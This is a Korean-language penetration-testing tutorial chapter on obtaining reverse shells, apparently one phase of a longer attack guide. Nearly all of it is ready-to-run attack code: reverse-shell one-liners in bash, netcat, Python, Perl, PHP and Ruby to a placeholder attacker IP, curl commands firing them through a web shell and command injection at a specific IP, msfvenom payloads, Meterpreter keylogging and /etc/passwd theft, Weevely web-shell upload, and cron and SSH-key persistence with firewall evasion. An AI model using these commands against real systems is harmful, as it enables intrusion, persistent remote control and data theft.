# Phase 4: Reverse Shell

웹 쉘 또는 명령 실행 취약점을 통해 안정적인 Reverse Shell을 획득하는 방법을 다룹니다.

## 📋 목차

1. [Reverse Shell 기본 개념](#reverse-shell-기본-개념)
2. [Netcat Reverse Shell](#netcat-reverse-shell)
3. [Python/Bash Reverse Shell](#pythonbash-reverse-shell)
4. [PHP Reverse Shell](#php-reverse-shell)
5. [Metasploit Reverse Shell](#metasploit-reverse-shell)
6. [Weevely 웹쉘](#weevely-웹쉘)
7. [Shell 안정화](#shell-안정화)

---

## Reverse Shell 기본 개념

### Reverse Shell vs Bind Shell

**Reverse Shell:**
- 공격 대상 서버가 공격자에게 연결
- 방화벽 우회 가능 (아웃바운드 연결 허용)

**Bind Shell:**
- 공격 대상 서버가 포트 개방, 공격자가 연결
- 방화벽에 막힐 가능성 높음

### 사전 준비

```bash
# 1. 공격자 IP 확인
ip addr show
# 또는 퍼블릭 IP
curl ifconfig.me

# 2. 리스너 포트 선택
# 일반적으로 사용: 4444, 4443, 8080, 443 (방화벽 우회)

# 3. 방화벽 규칙 (필요시)
sudo ufw allow 4444/tcp
```

---

## Netcat Reverse Shell

### 공격자 (Kali Linux)

```bash
# Netcat 리스너
nc -lvnp 4444

# 옵션 설명:
# -l : Listen 모드
# -v : Verbose (상세 출력)
# -n : DNS 조회 안 함 (빠름)
# -p : 포트 지정
```

### 대상 서버

```bash
# 기본 Netcat Reverse Shell
nc 공격자IP 4444 -e /bin/bash

# -e 옵션이 없는 경우 (OpenBSD nc)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 공격자IP 4444 > /tmp/f

# /dev/tcp 사용 (Netcat 없이)
bash -i >& /dev/tcp/공격자IP/4444 0>&1

# URL 인코딩 버전 (웹쉘에서 사용)
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F공격자IP%2F4444%200%3E%261%22
```

### 실전 예시

```bash
# 웹쉘을 통한 Reverse Shell 트리거
curl "http://3.35.218.180/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1'"

# 명령 주입 취약점 활용
curl "http://3.35.218.180/api/health.php?check=custom&cmd=nc YOUR_KALI_IP 4444 -e /bin/bash"
```

---

## Python/Bash Reverse Shell

### Python Reverse Shell

```python
# Python 한 줄 Reverse Shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("공격자IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# Python3 버전
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("공격자IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# 더 안정적인 Python Reverse Shell
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("공격자IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### Bash Reverse Shell

```bash
# Bash /dev/tcp
bash -i >& /dev/tcp/공격자IP/4444 0>&1

# Bash 5초마다 재연결 (안정성)
while true; do bash -i >& /dev/tcp/공격자IP/4444 0>&1; sleep 5; done

# exec를 사용한 버전
0<&196;exec 196<>/dev/tcp/공격자IP/4444; sh <&196 >&196 2>&196
```

### Perl Reverse Shell

```perl
perl -e 'use Socket;$i="공격자IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## PHP Reverse Shell

### 간단한 PHP Reverse Shell

```php
<?php
$sock = fsockopen("공격자IP", 4444);
$proc = proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

### PentestMonkey PHP Reverse Shell

```bash
# 다운로드
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

# IP와 포트 수정
sed -i 's/127.0.0.1/YOUR_KALI_IP/g' php-reverse-shell.php
sed -i 's/1234/4444/g' php-reverse-shell.php

# 업로드 후 실행
curl http://3.35.218.180/uploads/php-reverse-shell.php
```

### PHP 한 줄 Reverse Shell

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/공격자IP/4444 0>&1'"); ?>

// URL 파라미터로 사용
<?php system($_GET['cmd']); ?>
// http://target.com/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/공격자IP/4444 0>&1'
```

---

## Metasploit Reverse Shell

### Meterpreter 페이로드 생성

```bash
# PHP Meterpreter
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=YOUR_KALI_IP LPORT=4444 \
  -f raw > shell.php

# Linux ELF 바이너리
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=YOUR_KALI_IP LPORT=4444 \
  -f elf > shell.elf

# Linux x64 바이너리
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=YOUR_KALI_IP LPORT=4444 \
  -f elf > shell64.elf

# Python Reverse Shell
msfvenom -p cmd/unix/reverse_python \
  LHOST=YOUR_KALI_IP LPORT=4444 \
  -f raw > shell.py

# Bash Reverse Shell
msfvenom -p cmd/unix/reverse_bash \
  LHOST=YOUR_KALI_IP LPORT=4444 \
  -f raw > shell.sh
```

### Metasploit Handler 설정

```bash
# Metasploit 실행
msfconsole

# Handler 설정
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST YOUR_KALI_IP
set LPORT 4444
set ExitOnSession false
exploit -j -z

# 세션 확인
sessions -l

# 세션 접속
sessions -i 1
```

### Meterpreter 기본 명령

```bash
# 시스템 정보
sysinfo

# 현재 사용자
getuid

# 프로세스 목록
ps

# 권한 상승 시도
getsystem

# 쉘 획득
shell

# 파일 업로드
upload /root/tool.sh /tmp/tool.sh

# 파일 다운로드
download /etc/passwd /root/passwd

# 스크린샷 (GUI 환경인 경우)
screenshot

# 키로거
keyscan_start
keyscan_dump
keyscan_stop
```

---

## Weevely 웹쉘

### Weevely 설치

```bash
# Kali Linux에 기본 포함
weevely

# 없으면 설치
apt install weevely
```

### Weevely 웹쉘 생성

```bash
# 웹쉘 생성
weevely generate password123 /tmp/weevely.php

# 생성된 파일 업로드
curl -F "file=@/tmp/weevely.php" http://3.35.218.180/upload.php

# 연결
weevely http://3.35.218.180/uploads/weevely.php password123
```

### Weevely 기능

```bash
# 연결 후 사용 가능한 명령

# 시스템 정보
:system_info

# 네트워크 정보
:net_ifconfig

# MySQL 덤프
:sql_console -h localhost -u root -p password

# 파일 다운로드
:file_download /etc/passwd /root/passwd

# 파일 업로드
:file_upload /root/shell.elf /tmp/shell

# Reverse Shell 생성
:backdoor_reversetcp YOUR_KALI_IP 4444

# 일반 쉘 명령
ls -la
cat /etc/passwd
```

---

## Shell 안정화

### 기본 TTY Shell 획득

```bash
# 방법 1: Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 방법 2: Script 명령
/usr/bin/script -qc /bin/bash /dev/null

# 방법 3: Expect
echo 'spawn bash' | expect
```

### Fully Interactive TTY

```bash
# 1. 기본 shell 획득 후
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background로 전환 (Ctrl+Z)

# 3. Kali에서 설정
stty raw -echo; fg
# Enter 두 번

# 4. Shell에서 환경변수 설정
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 38 columns 116

# 화면 크기 확인 (Kali에서)
stty size
```

### Shell 유지 및 복구

```bash
# 백그라운드 작업으로 Reverse Shell 유지
nohup bash -c 'while true; do bash -i >& /dev/tcp/공격자IP/4444 0>&1; sleep 60; done' &

# Cron job으로 자동 재연결
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/공격자IP/4444 0>&1") | crontab -

# SSH 키 등록 (권한 있는 경우)
mkdir -p ~/.ssh
echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

---

## 방화벽 우회

### 다양한 포트 시도

```bash
# 일반적으로 허용되는 아웃바운드 포트
nc 공격자IP 443 -e /bin/bash   # HTTPS
nc 공격자IP 53 -e /bin/bash    # DNS
nc 공격자IP 80 -e /bin/bash    # HTTP
nc 공격자IP 22 -e /bin/bash    # SSH
```

### ICMP 터널 (극단적인 경우)

```bash
# 공격자
apt install ptunnel
ptunnel

# 대상 서버
ptunnel -p 공격자IP -lp 4444 -da 공격자IP -dp 4444
```

### HTTP 터널

```bash
# 공격자: Metasploit HTTP Handler
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_http
set LHOST YOUR_KALI_IP
set LPORT 80
exploit

# 대상 서버: HTTP Reverse Shell
msfvenom -p linux/x86/meterpreter/reverse_http \
  LHOST=공격자IP LPORT=80 -f elf > http_shell.elf
chmod +x http_shell.elf
./http_shell.elf
```

---

## 트러블슈팅

### Shell이 즉시 끊기는 경우

```bash
# 원인: 세션 타임아웃, 프로세스 죽음

# 해결: 무한 루프로 재연결
while true; do
    bash -i >& /dev/tcp/공격자IP/4444 0>&1
    sleep 10
done
```

### 명령 입력이 안 보이는 경우

```bash
# TTY 안정화
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Netcat -e 옵션이 없는 경우

```bash
# Named Pipe 사용
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc 공격자IP 4444 > /tmp/f
```

---

## Reverse Shell Cheatsheet

```bash
# Bash
bash -i >& /dev/tcp/공격자IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("공격자IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# Netcat
nc 공격자IP 4444 -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 공격자IP 4444 >/tmp/f

# PHP
php -r '$sock=fsockopen("공격자IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="공격자IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("공격자IP",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## 다음 단계

Reverse Shell 획득 후:
1. 권한 확인 (`id`, `whoami`)
2. 시스템 정보 수집 (`uname -a`, `cat /etc/os-release`)
3. 권한 상승 (Phase 5)

[→ Phase 5: Privilege Escalation으로 이동](05_privilege_escalation.md)
